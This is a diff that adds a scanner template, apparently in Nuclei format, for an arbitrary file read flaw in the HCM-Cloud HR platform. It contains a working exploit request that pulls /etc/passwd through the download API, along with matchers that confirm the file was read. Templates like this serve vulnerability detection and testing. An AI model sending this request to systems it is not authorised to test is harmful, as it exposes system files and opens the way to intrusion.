@@ -1,0 +1,31 @@
+id: poc-yaml-hcm-cloud-download-anyfile-read
+info:
+  name: HCM-Cloud File Download Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    HCM-Cloud Professional Human Resources Platform download arbitrary file read vulnerability.
+http:
+  - method: GET
+    path:
+      - "/api/model_report/file/download?index=/&ext=/etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+        part: body
+      - type: regex
+        regex:
+          - "filename="
+        part: header
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
